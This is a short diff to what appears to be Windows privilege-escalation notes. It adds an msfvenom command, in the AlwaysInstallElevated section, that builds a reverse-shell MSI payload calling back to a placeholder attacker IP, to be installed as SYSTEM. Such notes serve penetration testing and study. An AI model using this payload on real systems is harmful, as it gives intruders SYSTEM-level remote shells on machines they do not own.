@@ -480,6 +480,12 @@ If both values:
 AlwaysInstallElevated = 1
 ```
 
+Payload:
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+```
+
 Then install MSI as SYSTEM.
 
 ```
